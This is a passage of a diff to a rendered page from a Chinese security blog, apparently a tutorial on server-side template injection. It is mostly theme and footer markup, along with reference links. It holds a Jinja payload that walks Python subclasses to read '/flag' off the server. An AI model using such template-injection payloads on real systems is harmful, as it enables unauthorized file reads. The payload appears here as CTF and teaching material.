class="o">&amp;</span><span class="nx">subclasses</span><span class="o">=</span><span class="nx">__subclasses__</span>
 </code></pre></td></tr></table>
 </div>
-</div><h3 id="_--">_ +. +&rsquo;</h3>
-<div class="highlight"><div class="chroma">
+</div><h3 id="_--" class="headerLink">
+    <a href="#_--" class="header-mark"></a>_ +. +&rsquo;</h3><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -998,27 +1066,24 @@ for i in range(500):
 </span><span class="c1"></span><span class="p">{{</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="no">__class__</span><span class="o">.</span><span class="nx">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="nx">__subclasses__</span><span class="p">()[</span><span class="mi">91</span><span class="p">]</span><span class="o">.</span><span class="nx">get_data</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="s2">&#34;/flag&#34;</span><span class="p">)}}</span>
 </code></pre></td></tr></table>
 </div>
-</div><h1 id="参考文章">参考文章</h1>
-<p><a href="https://xz.aliyun.com/t/7746" target="_blank" rel="noopener noreffer">https://xz.aliyun.com/t/7746</a>
-</p>
-<p><a href="https://xz.aliyun.com/t/9584" target="_blank" rel="noopener noreffer">https://xz.aliyun.com/t/9584</a>
-</p>
-<p><a href="https://www.freebuf.com/articles/network/258136.html" target="_blank" rel="noopener noreffer">https://www.freebuf.com/articles/network/258136.html</a>
-</p>
-<p><a href="https://hoad-sc.blog.csdn.net/article/details/113778233" target="_blank" rel="noopener noreffer">https://hoad-sc.blog.csdn.net/article/details/113778233</a>
-</p>
-<p><a href="https://xz.aliyun.com/t/6885" target="_blank" rel="noopener noreffer">https://xz.aliyun.com/t/6885</a>
-</p>
-<p><a href="https://www.freebuf.com/articles/web/264088.html" target="_blank" rel="noopener noreffer">https://www.freebuf.com/articles/web/264088.html</a>
-</p>
-<p><a href="http://h0cksr.xyz/archives/340" target="_blank" rel="noopener noreffer">http://h0cksr.xyz/archives/340</a>
-</p>
-</div><div class="post-footer" id="post-footer">
+</div><h1 id="参考文章" class="headerLink">
+    <a href="#%e5%8f%82%e8%80%83%e6%96%87%e7%ab%a0" class="header-mark"></a>参考文章</h1><p><a href="https://xz.aliyun.com/t/7746" target="_blank" rel="noopener noreferrer">https://xz.aliyun.com/t/7746</a></p>
+<p><a href="https://xz.aliyun.com/t/9584" target="_blank" rel="noopener noreferrer">https://xz.aliyun.com/t/9584</a></p>
+<p><a href="https://www.freebuf.com/articles/network/258136.html" target="_blank" rel="noopener noreferrer">https://www.freebuf.com/articles/network/258136.html</a></p>
+<p><a href="https://hoad-sc.blog.csdn.net/article/details/113778233" target="_blank" rel="noopener noreferrer">https://hoad-sc.blog.csdn.net/article/details/113778233</a></p>
+<p><a href="https://xz.aliyun.com/t/6885" target="_blank" rel="noopener noreferrer">https://xz.aliyun.com/t/6885</a></p>
+<p><a href="https://www.freebuf.com/articles/web/264088.html" target="_blank" rel="noopener noreferrer">https://www.freebuf.com/articles/web/264088.html</a></p>
+<p><a href="http://h0cksr.xyz/archives/340" target="_blank" rel="noopener noreferrer">http://h0cksr.xyz/archives/340</a></p>
+</div>
+
+        <div class="post-footer" id="post-footer">
     <div class="post-info">
         <div class="post-info-line">
             <div class="post-info-mod">
                 <span>更新于 2022-09-19</span>
-            </div></div>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
         <div class="post-info-line">
             <div class="post-info-md"></div>
             <div class="post-info-share">
@@ -1034,20 +1099,26 @@ for i in range(500):
         </section>
     </div>
 
-    <div class="post-nav"><a href="/qwb2022/" class="prev" rel="prev" title="[2022强网杯] WP"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>[2022强网杯] WP</a>
-            <a href="/java%E5%AE%89%E5%85%A8_rmi/" class="next" rel="next" title="[Java安全]RMI">[Java安全]RMI<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+    <div class="post-nav"><a href="/qwb2022/" class="prev" rel="prev" title="[2022强网杯] WP"><i class="fas fa-angle-left fa-fw"></i>[2022强网杯] WP</a>
+            <a href="/java%E5%AE%89%E5%85%A8_rmi/" class="next" rel="next" title="[Java安全] RMI">[Java安全] RMI<i class="fas fa-angle-right fa-fw"></i></a></div>
 </div>
 </article></div>
-            </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line">2022</div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Huamang</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">2022</div><div class="footer-line"><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer">Huamang</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
                     <span class="icp"><a href="https://beian.miit.gov.cn/" target="_blank">赣ICP备2021001334号</a></span></div>
-        </div>
-    </footer></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
 
-        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
-                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
-            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
-                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
-            </a>
-        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.13.0/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.1/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.zh-cn","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.0/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.11.0/dist/algoliasearch.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/topbar@1.0.1/topbar.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@sliphua/pjax@2.4.0/dist/pjax.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script></div>
+
+<div class="pjax-assets"><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.zh-cn","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js"></script></div>
+</body>
+
 </html>
